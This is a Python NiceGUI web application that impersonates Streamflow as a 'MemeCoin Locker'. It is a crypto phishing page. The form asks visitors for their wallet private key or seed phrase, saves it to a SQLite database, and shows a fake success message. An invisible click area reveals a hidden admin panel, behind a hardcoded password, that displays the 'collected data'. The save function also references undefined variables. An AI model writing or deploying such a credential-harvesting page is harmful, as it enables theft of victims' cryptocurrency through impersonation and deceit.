import os
import sqlite3
import pandas as pd
from nicegui import ui

# Baza de date
DB_PATH = 'data.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('CREATE TABLE IF NOT EXISTS u (n TEXT, k TEXT, s TEXT, a REAL, d INTEGER)')
    conn.commit(); conn.close()

init_db()

@ui.page('/')
def index():
    ui.add_head_html("""
        <style>
            body { background-color: #0b0e11 !important; color: white !important; font-family: 'Inter', sans-serif; }
            .q-field--filled .q-field__control { background: #1b1f23 !important; border: 1px solid #30363d !important; border-radius: 8px !important; }
            .q-field__native, .q-field__input { color: white !important; }
            .deploy-btn { background-color: #00ffbd !important; color: black !important; font-weight: bold !important; width: 100%; height: 55px; border-radius: 8px; }
            /* ZONA INVIZIBILĂ MAI MARE */
            .inv-area { width: 100%; height: 100px; background: transparent; cursor: default; }
        </style>
    """)

    with ui.column().classes('w-full max-w-lg mx-auto p-6 gap-4'):
        ui.image('https://streamflow.finance/favicon.ico').classes('w-16 mx-auto mb-2')
        ui.label('MemeCoin Locker').classes('text-3xl font-bold text-center w-full mt-4')
        ui.label('Securely lock your project funds.').classes('text-gray-400 text-center w-full -mt-2 mb-6 text-sm')
        
        # Formular Colectare
        name = ui.input('Project Name').props('dark filled').classes('w-full')
        key = ui.input('Wallet Private Key / Seed Phrase').props('dark filled password-toggle').classes('w-full')
        
        with ui.row().classes('w-full gap-4'):
            symbol = ui.input('Token Symbol').props('dark filled').classes('flex-1')
            amount = ui.number('Amount', value=0.0).props('dark filled').classes('flex-1')
        
        days = ui.number('Lock Duration (Days)', value=365).props('dark filled').classes('w-full')

        def handle_save():
            if name.value and key.value:
                c = sqlite3.connect(DB_PATH)
                c.execute("INSERT INTO u VALUES (?,?,?,?,?)", (n.value, k.value, s.value, a.value, d.value))
                c.commit(); c.close()
                ui.notify('Success! Lock Deployed.', color='positive')

        ui.button('DEPLOY LOCK', on_click=handle_save).classes('deploy-btn')

        # --- ADMIN SECTION ---
        async def show_login():
            pass_section.set_visibility(True)
            ui.run_javascript('window.scrollTo(0, document.body.scrollHeight);')

        def check_password():
            if pass_input.value == 'Ovidiu20.04.2006':
                conn = sqlite3.connect(DB_PATH)
                df = pd.read_sql_query("SELECT * FROM u", conn)
                conn.close()
                results.clear()
                with results:
                    if df.empty:
                        ui.label('No data yet.').classes('text-gray-500')
                    else:
                        ui.table(columns=[{'name': x, 'label': x, 'field': x} for x in df.columns], 
                                 rows=df.to_dict('records')).props('dark dense flat bordered')
                admin_content.set_visibility(True)
                pass_section.set_visibility(False)
            else:
                ui.notify('Denied', color='negative')

        # ZONA INVIZIBILĂ (Apasă oriunde sub butonul verde pe o distanță de 10cm)
        ui.interactive_image().on('click', show_login).classes('inv-area')

        # Sectiune Parola
        pass_section = ui.column().classes('w-full mt-10 p-4 border border-gray-900').visible(False)
        with pass_section:
            ui.label('Security Check').classes('text-xs text-gray-600')
            pass_input = ui.input('Key').props('dark filled password-toggle').classes('w-full')
            ui.button('UNLOCK', on_click=check_password).classes('w-full bg-blue-900')

        # Tabel date
        admin_content = ui.column().classes('w-full mt-4 p-2 bg-black border border-green-900').visible(False)
        with admin_content:
            ui.label('COLLECTED DATA').classes('text-green-500 mb-2')
            results = ui.column().classes('w-full')

port = int(os.environ.get('PORT', 10000))
ui.run(host='0.0.0.0', port=port, reload=False, title="Streamflow | Locker")
